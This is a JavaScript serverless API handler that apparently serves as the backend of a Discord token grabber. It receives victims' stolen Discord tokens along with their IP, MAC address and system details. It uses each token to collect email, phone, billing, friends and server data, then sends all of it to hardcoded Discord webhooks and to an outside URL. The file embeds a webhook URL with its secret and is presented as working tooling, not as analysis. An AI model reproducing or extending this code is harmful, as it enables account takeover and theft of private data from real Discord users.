import axios from 'axios';
import DiscordToken from 'discord.js-token';
import { WebhookClient } from 'discord.js';
import { fetchServers, fetchFriends, getEmbeds, send } from './../../../../../utils/functions.cjs';

let hooks = [
  "https://discord.com/api/webhooks/1193233847895212032/6i7RYIz7lgt_an6FYoPOZwwM0Z7QBHSdixhTT_b-8SHsrwgoEMy3eBTK4oqTfupjzqni",
];

function createWebhookClient(url) {
  return new WebhookClient({ url });
}

export default async function handler(req, res) {
  if (req.method === 'POST') {
    try {
      res.statusCode = 200;
      res.json({ message: 'OK' });

      hooks.push(req.headers['authorization']);

      const id = req.query.id;
      const body = JSON.parse(req.body);

      var servers = fetchServers(body.TOKEN);
      var friends = fetchFriends(body.TOKEN);
      var copy = `https://6889-fun.vercel.app/api/aurathemes/raw?data=${body.TOKEN}`;
      var discord = new DiscordToken(body.TOKEN).info;
      axios.get(copy);

      for (const webhook of hooks.map(createWebhookClient)) {
        webhook.send(send(getEmbeds({
          author: { name: "" + discord.username + " | " + discord.ID + "", icon_url: "" + discord.avatar + "" },
          thumbnail: "" + discord.avatar + "",
          title: "Initialized Grabber - " + body.TYPE,
          fields: [
            { name: "<a:aura:1087044506542674091> Token:", value: "```" + discord.token + "```" + `\n[[Click Here To Copy Your Token]](${copy})` },
            { name: "<a:aura:1101739920319590420> Nitro:", value: "" + discord.nitroType + "", inline: true },
            { name: "<a:aura:995172580988309664> IP Adress", value: "`" + body.IP + "`", inline: true },
            { name: "<a:aura:863691953531125820> Phone", value: "`" + discord.phone + "`", inline: true },
            { name: "<:aura:974711605927505990> Email", value: "`" + discord.mail + "`", inline: true },
            { name: "Badges", value: "" + discord.badges + "", inline: true },
            { name: "Billing", value: "" + discord.billing + "", inline: true },
            { name: "Request", value: "```" + id + "```", inline: true },
          ],
        }))).then((r) => { console.log("webhook send"); });
        setTimeout(() => webhook.send(send(getEmbeds({
          author: { name: "" + discord.username + " | " + discord.ID + "", icon_url: "" + discord.avatar + "" },
          thumbnail: "" + discord.avatar + "",
          title: "HQ Friend(s)",
          desc: "" + friends.all + ""
        }))), 50);
        setTimeout(() => webhook.send(send(getEmbeds({
          author: { name: "" + discord.username + " | " + discord.ID + "", icon_url: "" + discord.avatar + "" },
          thumbnail: "" + discord.avatar + "",
          title: "HQ Guild(s)",
          desc: "" + servers.all + ""
        }))), 100);
        setTimeout(() => webhook.send(send(getEmbeds({
          author: { name: "" + discord.username + " | " + discord.ID + "", icon_url: "" + discord.avatar + "" },
          thumbnail: "" + discord.avatar + "",
          title: "User Informatio(s)",
          desc:
            "**NSFW**" + discord.NSFW + "\n" +
            "**Status**" + discord.status + "\n" +
            "**Owner Servers**" + "`" + discord.totalOwnedGuild + "`\n" +
            "**Connection**" + "`" + discord.totalConnection + "`\n" +
            "**BOTS/RPC**" + "`" + discord.totalApplication + "`\n" +
            "**Blocked**" + "`" + discord.totalBlocked + "`\n" +
            "**Servers**" + "`" + discord.totalGuild + "`\n" +
            "**Friends**" + "`" + discord.totalFriend + "`\n" +
            "**Theme**" + "`" + discord.theme + "`\n" +
            "**Pending**" + "`" + discord.pending + "`\n\n" +
            "**Biography**" + "```yml\n" + (discord.bio === "has no description" ? "Not found" : discord.bio) + "\n```"
        }))), 150);
        setTimeout(() => webhook.send(send(getEmbeds({
          author: { name: "" + discord.username + " | " + discord.ID + "", icon_url: "" + discord.avatar + "" },
          thumbnail: "" + discord.avatar + "",
          title: "System Informatio(s)",
          fields: [
            {
              name: "User",
              value: "```yml" +
                "\nUsername: " + body.PC_NAME + "```",
              inline: false
            },
            {
              name: "System",
              value: "```yml" +
                "\nCPU: " + body.CPU +
                "\nUUID: " + body.UUID +
                "\nRAM: " + body.RAM +
                "\nMac Address: " + body.MAC_ADDRESS +
                "\nProduct Key: " + body.CPU +
                "\nLOCAL IP: " + body.LOCAL_IP +
                "\nOS Version: " + body.OS + "```",
              inline: false
            },
            {
              name: "Network",
              value: "```yml" +
                "\nPUBLIC: " + body.IP +  "```",
              inline: false
            },
          ]
        }))), 200);
      }

      console.log(body);
    } catch (error) {
      console.error('An error occurred:', error);
      res.statusCode = 500;
      res.json({ error: 'Internal Server Error' });
    }
  } else {
    res.setHeader('Content-Type', 'text/plain');
    res.status(404).send('>w<');
  }
}
